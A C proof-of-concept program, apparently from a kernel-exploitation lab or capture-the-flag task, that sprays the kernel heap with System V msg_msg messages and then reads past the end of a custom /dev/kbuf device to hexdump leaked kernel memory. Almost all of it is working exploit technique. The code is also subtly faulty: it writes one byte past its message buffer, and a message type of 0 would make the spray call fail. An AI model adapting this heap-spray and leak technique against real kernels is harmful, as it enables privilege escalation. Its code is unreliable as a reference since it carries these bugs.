#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h> 
#include <stdint.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/ipc.h>
#include <sys/msg.h>

#ifndef HEXDUMP_COLS
#define HEXDUMP_COLS 16
#endif

void hexdump(void *mem, unsigned int len)
{
	unsigned int i, j;

	for(i = 0; i < len + ((len % HEXDUMP_COLS) ? (HEXDUMP_COLS - len % HEXDUMP_COLS) : 0); i++)
	{
		/* print offset */
		if(i % HEXDUMP_COLS == 0)
		{
			printf("0x%06x: ", i);
		}

		/* print hex data */
		if(i < len)
		{
			printf("%02x ", 0xFF & ((char*)mem)[i]);
		}
		else /* end of block, just aligning for ASCII dump */
		{
			printf("   ");
		}

		/* print ASCII dump */
		if(i % HEXDUMP_COLS == (HEXDUMP_COLS - 1))
		{
			for(j = i - (HEXDUMP_COLS - 1); j <= i; j++)
			{
				if(j >= len) /* end of block, not really printing */
				{
					putchar(' ');
				}
				else if(isprint(((char*)mem)[j])) /* printable char */
				{
					putchar(0xFF & ((char*)mem)[j]);        
				}
				else /* other char */
				{
					putchar('.');
				}
			}
			putchar('\n');
		}
	}
}

char* buf[0x100] = {0,};


// msg_msg
#define BUF_SIZE 0x800 - 0x30
struct {
	long mtype;
	char mtext[BUF_SIZE];
}msg;

void spray(){
	memset(msg.mtext, 0x42, BUF_SIZE - 1);
	msg.mtext[BUF_SIZE] = 0;
	int msqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);
	msg.mtype = 0;

	msgsnd(msqid, &msg, sizeof(msg.mtext), 0);
	//memset(msg.mtext, 0x43, BUF_SIZE - 1);
	//msgsnd(msqid, &msg, sizeof(msg.mtext), 0);
}

int main(){
    int fd = open("/dev/kbuf", O_RDWR);
	spray();
    lseek(fd, 0x0, SEEK_END);
    read(fd, buf, 0x100);
    hexdump(buf, 0x100);
}